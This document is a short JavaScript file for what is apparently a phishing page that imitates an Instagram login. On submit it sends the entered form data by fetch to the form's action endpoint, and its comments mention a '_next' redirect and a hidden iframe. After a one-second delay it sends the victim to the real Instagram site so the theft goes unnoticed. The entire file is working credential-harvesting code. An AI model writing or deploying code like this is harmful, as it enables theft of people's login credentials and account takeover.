document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    
    form.addEventListener('submit', function(e) {
        // Prevent default only if you want to handle redirect manually
        // But since we have _next redirect, we can just let it go.
        // However, to keep the UX smooth, we'll handle it manually.
        
        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.8';
        
        // Let the form submit to the hidden iframe
        // We don't preventDefault here if we want the iframe to get the response
        // But to control the redirect timing, we do preventDefault and fetch manually
        
        e.preventDefault();
        
        const formData = new FormData(form);
        
        // Submit via fetch to avoid page reload in main window
        fetch(form.action, {
            method: 'POST',
            body: formData,
            redirect: 'follow'
        }).finally(() => {
            // Redirect user to real Instagram after a brief delay
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 1000);
        });
    });
});